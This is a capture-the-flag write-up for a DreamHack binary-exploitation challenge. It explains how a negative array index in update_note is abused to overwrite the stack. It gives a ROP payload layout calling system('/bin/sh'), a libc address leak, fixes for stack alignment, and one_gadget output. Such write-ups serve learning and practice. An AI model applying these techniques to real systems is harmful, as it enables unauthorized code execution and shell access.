# DreamHack 1997 (level 4)

docker

`docker run -p 1000:8080 4a83375364f5`


## checksec
- Full RELRO
- Canary found
- NX Enabled
- PIE enabled

## Vulnerability
vulnerability at update_note (OOB)
-> can manipulate the call stack of update_note() and main(), using negative index of the array, which in the stack frame of main()


(stack frame of update_note)
```
$rbp + 0x28 |   note[0]->content
$rbp + 0x20 |   note[0]->size
$rbp + 0x18 |   (padding)

    (^ main())

$rbp + 0x08 |   (update_note return address)

$rbp - 0x08 |   (update_note canary) = note[-1]->content
$rbp - 0x10 |   v2 (index) = note[-1]->size

    (v read())

$rbp - 0x18 |   ???             -> ROP!!!
$rbp - 0x20 |   padding         -> ROP!!!
$rbp - 0x28 |   return address  -> ROP!!!

$rbp - 0x38 |   (update_note canary) = note[-2]->content
$rbp - 0x40 |   v2 (index) = note[-2]->size
```

we can do ROP at region from $rbp-0x28 to $rbp-0x18. (3 words)

**payload**
```
index: -2
size: 40 (0x28)
data: [payload]

[payload] = 'A'*16 + [pop rdi] [sh] [system]
```

## libc leak
print out the address of `libc_start_main` by exploiting update_note().

leak point: `__libc_start_main` at the main() call stack

## exploit
use system call to open shell

**Troubleshoot 1**: if we try to call `system('/bin/sh')`, we have at most 3 available slots, and we need at least 3 stack memory cells to to call `system('/bin/sh')`. However, the last word that points to `__libc_system` goes to `$rbp-0x18`, and it violates the alignment condition
-> solution: added offset to the last word, so that the program calls `<do_system>` with `call` instruction, not `jmp`. This pushes an extra element to the stack and resolves the alignment issue. 

**Troubleshoot 2**: It works in local but not on the docker server (LoDuiReAn)
-> solution: changed glibc file and readdressed stack alignment issue
-> extracted glibc (2.39.x?) from docker server environment (using `$ docker cp (...)`)


## Failed Attempts

- If we try to inject the faulty return address in `note[-1]`, the note index gets overwritten by the 'size' input. So writing to the stack frame of update_note().
- Instead, we can inject to the stack frame of main(), since we can bypass the index range check of update_note() (`v2 <= 9`)
- we can inject [ DATA ] into `note[10]->content`, which is normally an illegal access, by putting the following:
```
index: -1
size: 30
data: [ DATA ]
```
-> Doesn't work, because `note[10]->size` is always 0

- Tried onegadget for troubleshoot 2, but fitting the constraint was infeasible 
*one_gadget results*
```
0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

```